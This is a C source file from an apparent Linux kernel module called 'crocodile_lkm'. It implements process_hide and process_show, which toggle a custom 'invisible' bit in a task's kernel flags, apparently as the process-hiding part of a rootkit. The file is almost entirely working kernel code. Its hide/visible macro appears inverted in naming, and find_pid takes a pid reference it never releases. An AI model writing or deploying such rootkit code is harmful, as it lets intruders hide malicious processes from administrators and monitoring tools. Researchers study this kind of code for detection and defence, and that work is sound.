/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/pid.h>
#include <linux/pid_namespace.h>

#include "ctrl/details/proc.h"

/******************************************************************************
 *  Private functions.
 ******************************************************************************/

#define INVISIBLE_BIT               0x10000000
#define IS_PROC_HIDDEN(p_task)      ((p_task->flags & INVISIBLE_BIT) == 0)

/******************************************************************************
 *  Public functions.
 ******************************************************************************/

struct pid* find_pid(pid_t nr)
{
    struct pid *pid;

    rcu_read_lock();
    pid = get_pid(find_vpid(nr));
    rcu_read_unlock();

    return pid;
}

/*
struct task_struct* find_process(pid_t pid)
{
    struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid) {
			return p;
		}
	}
	return NULL;
}
*/

struct task_struct* find_process(pid_t pid)
{
    struct pid* p_pid = find_pid(pid);
    enum pid_type type = PIDTYPE_PID;
    struct task_struct* p_task = NULL;
    
    rcu_read_lock();
    p_task = pid_task(p_pid, type);
    if (p_task) {
        get_task_struct(p_task);
    }
    rcu_read_unlock();
    return p_task;
}

long process_hide(pid_t pid)
{
    struct task_struct* p_task = NULL;
    p_task = find_process(pid);
    if (p_task == NULL) {
        return -ESRCH; /* No such process */
    }

    if (! IS_PROC_HIDDEN(p_task)) {
        p_task->flags ^= INVISIBLE_BIT;
    }
    return 0;
}

long process_show(pid_t pid)
{
    struct task_struct* p_task = NULL;
    p_task = find_process(pid);
    if (p_task == NULL) {
        return -ESRCH; /* No such process */
    }

    if (IS_PROC_HIDDEN(p_task)) {
        p_task->flags ^= INVISIBLE_BIT;
    }
    return 0;
}

#undef IS_PROC_HIDDEN
#undef INVISIBLE_BIT

